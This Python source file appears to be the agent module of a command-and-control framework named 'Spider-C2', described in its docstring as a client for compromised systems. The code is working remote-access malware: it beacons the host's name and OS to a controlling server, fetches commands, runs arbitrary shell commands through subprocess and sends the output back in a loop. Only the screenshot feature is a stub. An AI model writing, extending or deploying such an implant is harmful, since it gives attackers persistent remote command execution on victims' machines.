"""
Spider-C2 Module : Agent
Client agent for compromised systems.
"""

import requests
import json
import time
import platform
import uuid
import subprocess
import os

class C2Agent:
    def __init__(self, server_url, encryption_key):
        self.server_url = server_url
        self.encryption_key = encryption_key
        self.agent_id = str(uuid.uuid4())
        self.hostname = platform.node()
        self.os = platform.platform()
        self.running = True

    def checkin(self):
        try:
            data = {
                "agent_id": self.agent_id,
                "hostname": self.hostname,
                "os": self.os
            }
            response = requests.post(f"{self.server_url}/api/checkin", json=data, timeout=10)
            if response.status_code == 200:
                result = response.json()
                return result.get("commands", [])
        except:
            pass
        return []

    def execute(self, command):
        try:
            if command == "sysinfo":
                return json.dumps({
                    "hostname": self.hostname,
                    "os": self.os,
                    "agent_id": self.agent_id
                })
            elif command.startswith("shell:"):
                cmd = command.replace("shell:", "")
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                return result.stdout or result.stderr
            elif command == "screenshot":
                return "[Screenshot placeholder]"
            else:
                return f"Unknown command: {command}"
        except Exception as e:
            return f"Error: {str(e)}"

    def submit(self, result):
        try:
            data = {
                "agent_id": self.agent_id,
                "result": result
            }
            requests.post(f"{self.server_url}/api/submit", json=data, timeout=10)
        except:
            pass

    def run(self, heartbeat=30):
        print(f"[*] Agent {self.agent_id} started")
        while self.running:
            commands = self.checkin()
            for cmd in commands:
                result = self.execute(cmd)
                self.submit(result)
            time.sleep(heartbeat)
